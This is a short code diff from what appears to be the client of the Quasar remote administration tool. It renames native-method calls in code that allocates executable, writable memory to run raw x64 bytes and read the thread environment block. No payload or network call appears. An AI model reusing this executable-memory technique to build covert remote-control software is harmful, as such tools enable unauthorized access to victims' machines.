@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Quasar.Client.Utilities;
+using System;
 using System.Runtime.InteropServices;
 
 namespace Quasar.Client.Win32PE.Structs
@@ -28,7 +29,7 @@ namespace Quasar.Client.Win32PE.Structs
 
             var codeBytes = _x64TebBytes;
 
-            _codePointer = NativeMethods.VirtualAlloc(IntPtr.Zero, new UIntPtr((uint)codeBytes.Length),
+            _codePointer = ClientNatives.VirtualAlloc(IntPtr.Zero, new UIntPtr((uint)codeBytes.Length),
                 AllocationType.COMMIT | AllocationType.RESERVE,
                 MemoryProtection.EXECUTE_READWRITE
             );
@@ -50,7 +51,7 @@ namespace Quasar.Client.Win32PE.Structs
             }
             else
             {
-                return NativeMethods.NtCurrentTeb();
+                return ClientNatives.NtCurrentTeb();
             }
         }
 
